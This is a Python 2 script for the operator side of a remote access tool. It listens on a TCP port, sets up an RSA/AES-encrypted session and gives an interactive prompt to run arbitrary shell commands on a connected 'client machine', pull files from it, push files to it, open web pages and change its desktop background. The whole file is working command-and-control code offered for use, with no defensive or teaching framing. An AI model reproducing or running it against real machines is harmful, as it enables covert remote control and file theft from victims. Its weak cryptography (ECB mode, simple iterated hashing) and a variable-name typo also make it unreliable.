#!/usr/bin/env python

import socket 
import os      
import threading
import subprocess
import hashlib
import socket
import random
import string
import Crypto
import Crypto.Random
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES




# salt size in bytes
SALT_SIZE = 16

# number of iterations in the key generation
NUMBER_OF_ITERATIONS = 20

# the size multiple required for AES
AES_MULTIPLE = 16

def generate_key(password, salt, iterations):
    assert iterations > 0

    key = password + salt

    for i in range(iterations):
        key = hashlib.sha256(key).digest()  

    return key

def pad_text(text, multiple):
    extra_bytes = len(text) % multiple

    padding_size = multiple - extra_bytes

    padding = chr(padding_size) * padding_size

    padded_text = text + padding

    return padded_text

def unpad_text(padded_text):
    padding_size = ord(padded_text[-1])

    text = padded_text[:-padding_size]

    return text

def encrypt(plaintext, password):
    salt = Crypto.Random.get_random_bytes(SALT_SIZE)

    key = generate_key(password, salt, NUMBER_OF_ITERATIONS)

    cipher = AES.new(key, AES.MODE_ECB)

    padded_plaintext = pad_text(plaintext, AES_MULTIPLE)

    ciphertext = cipher.encrypt(padded_plaintext)

    ciphertext_with_salt = salt + ciphertext

    return ciphertext_with_salt

def decrypt(ciphertext, password):
    salt = ciphertext[0:SALT_SIZE]

    ciphertext_sans_salt = ciphertext[SALT_SIZE:]

    key = generate_key(password, salt, NUMBER_OF_ITERATIONS)

    cipher = AES.new(key, AES.MODE_ECB)

    padded_plaintext = cipher.decrypt(ciphertext_sans_salt)

    plaintext = unpad_text(padded_plaintext)

    return plaintext




def download(conn,command):

	x,src,dst=map(str,command.split(' '))
	conn.send(command)
	f = open(dst,'wb') 
	bits = conn.recv(1024)
	while bits!='': 
		if 'Unable to find out the file' in bits:
			print '[-] Unable to find out the file'
			break
		if not bits.endswith('DONE'):
			f.write(bits)
		
		if bits.endswith('DONE'):
			bits=bits.replace('DONE','')
			f.write(bits)
			f.close()
			break
		bits=conn.recv(1024)

	md5_sv=hashlib.md5(open(dst,'rb').read()).hexdigest()	
	conn.send(md5_sv)
	if conn.recv(1024)=='md5 OK':
		print '[+] MD5 Checksum Verified, File Downloaded Succesfully !'
	else :
		print '[-] MD5 Checksum Not Verified, File not Downloaded Succesfully'
	
	
        
    
def upload(conn,command):


	x,src,dst=map(str,command.split(' '))
	conn.send(command)
	file_to_send=open(src,'rb')
	packet=file_to_send.read(1024)
	while packet!='':
		conn.send(packet) 
		packet = file_to_send.read(1024)
	conn.send('DONE')
	file_to_send.close()
	md5_sv=hashlib.md5(open(src,'rb').read()).hexdigest()
	conn.send(md5_sv)
	print md5_sv
	if conn.recv(1024)=='md5 OK':
		print '[+] MD5 Checksum Verified, File Uploaded Succesfully !'
	else :
		print '[-] MD5 Checksum not Verified !'


def _help():


	subprocess.call('clear',shell=True)
	print 'To see the manual of each command type help(command) ex:help(download) , to exit this menu type exit\n' 
	
	while True:
		help_command=str(raw_input('Help)'))
		if help_command=='exit':
			break
		elif help_command=='help(terminate)':
			print 'terminate ends the session'
		elif help_command=='help(download)':
			print 'download => downloads a file from the client machine ex: download #source #dest'
		elif help_command=='help(upload)':
			print 'upload => uploads a file to the client machine ex: upload #source #dest'
		elif hel_command=='help(username)':
			print 'username => returns the username of the client session'
		elif hel_command=='help(browse)':
			print 'browse => launches a web page in the client browser ex: browse www.google.com'
		elif hel_command=='help(change_desktop_bg)':
			print 'change_desktop_bg => changes the desktop background of the client ex : change_desktop_bg #path_of_image'
	return

def _list():

	print '\nAvailable commands:'
	print '\nupload\ndownload\nclear\nhelp\nchange_desktop_bg\nbrowse\n'	


def connect():
        alpha=[0,1,2,3,4,5,6,7,8,9]
        secret=''
        for i in range(16):
        	secret+=random.choice(string.letters)
        	secret+=str(random.choice(alpha))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('192.168.1.4', 8080))
        s.listen(100)
        print '[+] Listening for incoming TCP connection on port 8080'
        conn,addr=s.accept()
        print '[+] We got a connection from: ', addr[0]

        username=conn.recv(1024)

        client_public_text=conn.recv(1024)
        client_public=RSA.importKey(client_public_text)

        secret_encrypted=client_public.encrypt(secret, None)

        conn.send(secret_encrypted[0])

        client_secret=conn.recv(1024)
        if client_secret==secret:
            print 'The secret key was sent successfully'

        print 'To go to the menu of the manual of commands type help \n'
        print 'To list the available commands type ?\n'
        while True:   
               	command=raw_input(">")		
                if 'terminate' in command:
                        conn.send('terminate')
                        conn.close() 
                        break
                elif 'download' in command: 
                        download(conn,command)
                elif 'upload' in command:
                        upload(conn,command)
                elif 'browse' in command:
                        conn.send(command)
                        pass	
                elif 'change_desktop_bg' in command:
                        conn.send(command)
                        pass
                elif 'clear' in command:
                		subprocess.call('clear',shell=True)
                		pass
                elif command=='help':
                		_help()
                elif command=='?':
                		_list()
                elif command=='':
                		pass
                else :	
                        conn.send(encrypt(command,secret))
                        result=conn.recv(2048)
                       	result2=decrypt(result,secret)
                       	print result2
        
def main ():
	subprocess.call('clear',shell=True)
	connect()
main()











